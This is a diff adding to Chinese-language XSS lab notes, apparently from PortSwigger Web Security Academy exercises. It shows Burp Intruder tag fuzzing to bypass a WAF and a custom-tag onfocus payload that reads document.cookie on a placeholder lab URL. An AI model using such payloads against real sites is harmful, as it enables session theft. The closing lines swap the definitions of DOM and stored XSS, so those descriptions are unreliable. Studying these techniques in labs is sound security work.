@@ -125,5 +125,18 @@ https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script
 ```
 `攻击需要外部传递机制，这意味着反射型 XSS 的影响通常不如存储型 XSS 严重，存储型 XSS 可以在易受攻击的应用程序本身内发起自包含攻击。`
 
+#### 不同环境下的XSS
+##### （1）HTML 标签之间的 XSS
+###### 大多数标签和属性被过滤
+`使用burpsuite intruder 测试可以绕过WAF的tag(使用BP的xss备忘录)`
+![image](https://github.com/user-attachments/assets/2c75dd0b-3e1b-42c3-ab7a-66bf56e75ed7)
+![image](https://github.com/user-attachments/assets/a9e73021-97af-4c74-95d5-1bf14ed610f5)
+###### 除了自定义标签外，所有标签都被禁用
+`使用自定义标签和可用的属性,tabindex利于触发`
+```
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+```
 ### (2) DOM型XSS -- 恶意脚本来自网站的数据库
 ### (3) 存储型XSS -- 漏洞存在于客户端代码中，而不是服务器端代码中。
